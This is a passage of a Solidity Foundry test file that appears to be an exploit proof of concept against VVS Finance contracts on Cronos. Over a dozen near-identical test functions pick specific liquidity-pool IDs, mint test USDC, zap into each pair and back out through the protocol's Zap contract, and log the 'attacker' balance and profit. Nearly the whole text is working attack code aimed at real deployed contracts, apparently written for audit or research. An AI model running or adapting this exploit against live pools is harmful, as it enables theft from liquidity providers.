    // --------------------------------------------------------------------------------------------
    // Inflated VVS_V3S_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_VVS_V3S_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 27;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_FOR_VVS_PAIR;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_VSHARE_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_VSHARE_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 28;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated VERSA_VVS_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_VERSA_VVS_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 30;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated VVS_ARGO_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_VVS_ARGO_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 31;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_FOR_VVS_PAIR;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated ARGO_USDC_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_ARGO_USDC_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 32;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_bCRO_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_bCRO_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 34;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated VVS_FER_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_VVS_FER_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 36;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_FOR_VVS_PAIR;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated MTD_VVS_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_MTD_VVS_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 37;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated VVS_CROID_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_VVS_CROID_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 47;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_FOR_VVS_PAIR;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated VVS_VNO_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_VVS_VNO_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 50;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_FOR_VVS_PAIR;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated VVS_FUL_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_VVS_FUL_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 51;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_FOR_VVS_PAIR;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated VVS_BONE_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_VVS_BONE_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 52;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_FOR_VVS_PAIR;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_XRP_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_XRP_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 53;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_VNO_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_VNO_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 55;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated WCRO_FUL_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_WCRO_FUL_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 56;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    // --------------------------------------------------------------------------------------------
    // Inflated BEAT_WCRO_Pair
    // --------------------------------------------------------------------------------------------
    function testFail__inflated_BEAT_WCRO_Pair__LP() public {
        // Approval
        VVS.approve(address(Zap), type(uint256).max);
        VVS.approve(address(Craftsman), type(uint256).max);
        VVS.approve(address(Router), type(uint256).max);
        VVS.approve(address(this), type(uint256).max);
        VVS.approve(address(Zap), type(uint256).max);
        USDC.approve(address(Router), type(uint256).max);

        uint lp_pid = 57;

        // Craftsman's PoolInfo
        address lpToken;
        uint256 allocPoint;
        uint256 lastRewardBlock;
        uint256 accVVSPerShare;

        (lpToken, allocPoint, lastRewardBlock, accVVSPerShare) = Craftsman.poolInfo(lp_pid);

        // Determine if the address is a smart contract
        if (ContractHelper.isContract(lpToken)) {
            require (!ContractHelper.hasSuffixOf13Zeros(accVVSPerShare), "Cannot be Boost Farm");

            // Fund the account with flashloan and/or cash
            uint account_deposit_amount = MAX_USDC;
            writeTokenBalance(address(this), address(USDC), account_deposit_amount);

            emit log_named_decimal_uint(
                "[Start] Attacker USDC balance before exploit",
                USDC.balanceOf(address(this)),
                USDC.decimals()
            );

            // Assign label to address
            cheats.label(lpToken, ICronosCRC20(lpToken).symbol());

            handle_valid_lp(lp_pid, lpToken, account_deposit_amount);
        }
    }

    function handle_valid_lp(uint lp_pid, address lpToken, uint account_deposit_amount) private {
        IVVSPair lp_pair = IVVSPair(lpToken);
        IERC20 symbol0 = IERC20(lp_pair.token0());
        IERC20 symbol1 = IERC20(lp_pair.token1());
        string memory pair_name = StringHelper.concatenateStringsWithSlash(symbol0.symbol(), symbol1.symbol());
        console.log("[Start] Target LP @ %s, PID: %d, Pair: %s", lpToken, lp_pid, pair_name);

        // Assign label to address
        cheats.label(address(symbol0), symbol0.symbol());
        cheats.label(address(symbol1), symbol1.symbol());
        cheats.label(address(lp_pair), pair_name);

        // Pair-specific Approval
        lp_pair.approve(address(Zap), type(uint256).max);
        lp_pair.approve(address(Craftsman), type(uint256).max);
        lp_pair.approve(address(this), type(uint256).max);
        lp_pair.approve(address(symbol0), type(uint256).max);

        symbol0.approve(address(this), type(uint256).max);
        symbol1.approve(address(this), type(uint256).max);

        symbol0.approve(address(Zap), type(uint256).max);
        symbol0.approve(address(Router), type(uint256).max);
        symbol1.approve(address(Router), type(uint256).max);
        symbol0.approve(address(lp_pair), type(uint256).max);

        VVS.approve(address(lp_pair), type(uint256).max);

        if (symbol0 == VVS) {
            // Convert USDC to symbol0
            USDC_to_symbol(symbol0, type(uint256).max);
        } else if (symbol0 == USDC) {
            // Convert USDC to VVS for staking
            USDC_to_symbol(VVS, USDC.balanceOf(address(this)) * 50 / 100);
        } else {
            // Convert USDC to symbol0 for deposit and withdrawal
            USDC_to_symbol(symbol0, USDC.balanceOf(address(this)) * 50 / 100);

            // Convert USDC to VVS for staking
            USDC_to_symbol(VVS, USDC.balanceOf(address(this)) * 50 / 100);
        }

        // if (symbol0 != VVS) {
        //     emit log_named_decimal_uint(
        //         "[Start] Attacker VVS balance before exploit",
        //         VVS.balanceOf(address(this)),
        //         VVS.decimals()
        //     );
        // }

        // emit log_named_decimal_uint(
        //     "[Start] Attacker symbol0 balance before exploit",
        //     symbol0.balanceOf(address(this)),
        //     symbol0.decimals()
        // );
        console.log("---------------------------------------------------------------------");

        if (symbol0 == VVS || symbol0 == USDC) {
            // Swap symbol0 tokens into LP
            Zap.zapIn{value: symbol0.balanceOf(address(this)) * 99 / 100}(
                address(lp_pair),
                1
            );
        } else {
            // Swap symbol0 tokens into LP
            Zap.zapIn{value: symbol0.balanceOf(address(this))}(
                address(lp_pair),
                1
            );
        }

        // if (symbol0 != VVS) {
        //     emit log_named_decimal_uint(
        //         "[Mid] Attacker VVS balance after deposit",
        //         VVS.balanceOf(address(this)),
        //         VVS.decimals()
        //     );
        // }

        // emit log_named_decimal_uint(
        //     "[Mid] Attacker symbol0 balance after deposit",
        //     symbol0.balanceOf(address(this)),
        //     symbol0.decimals()
        // );
        // console.log("---------------------------------------------------------------------");

        // Withdraw token(s) out from Pair LP
        Zap.zapOut(
            address(lp_pair),
            lp_pair.balanceOf(address(this)),
            address(symbol0),
            1
        );

        if (symbol0 != USDC) {
            if (symbol0.balanceOf(address(this)) > 0) {
                // Convert symbol0 back to USDC
                symbol_to_USDC(symbol0, type(uint256).max);
            }
        }

        // INFO: APE, DARK etc. symbol could not be converted to USDC
        if (symbol1 != USDC && symbol1 != APE && symbol1 != DARK && symbol1 != SKY && symbol1 != LCRO) {
            if (symbol1.balanceOf(address(this)) > 0) {
                // Convert symbol1 back to USDC
                symbol_to_USDC(symbol1, type(uint256).max);
            }
        }

        if (symbol0 != VVS) {
            if (VVS.balanceOf(address(this)) > 0) {
                // Convert VVS back to USDC
                symbol_to_USDC(VVS, type(uint256).max);
            }
        }

        // emit log_named_decimal_uint(
        //     "[End] Attacker symbol0 balance after exploit",
        //     symbol0.balanceOf(address(this)),
        //     symbol0.decimals()
        // );

        // emit log_named_decimal_uint(
        //     "[End] Attacker symbol1 balance after exploit",
        //     symbol1.balanceOf(address(this)),
        //     symbol1.decimals()
        // );

        // emit log_named_decimal_uint(
        //     "[End] Attacker VVS balance after exploit",
        //     VVS.balanceOf(address(this)),
        //     VVS.decimals()
        // );

        emit log_named_decimal_uint(
            "[End] Attacker USDC balance after exploit",
            USDC.balanceOf(address(this)),
            USDC.decimals()
        );

        console.log("---------------------------------------------------------------------");
        if (USDC.balanceOf(address(this)) > account_deposit_amount) {
            uint attacker_profit = USDC.balanceOf(address(this)).sub(account_deposit_amount);
            emit log_named_decimal_uint(
                "Attacker Profit in USDC",
                attacker_profit,
                USDC.decimals()
            );
        }
    }
}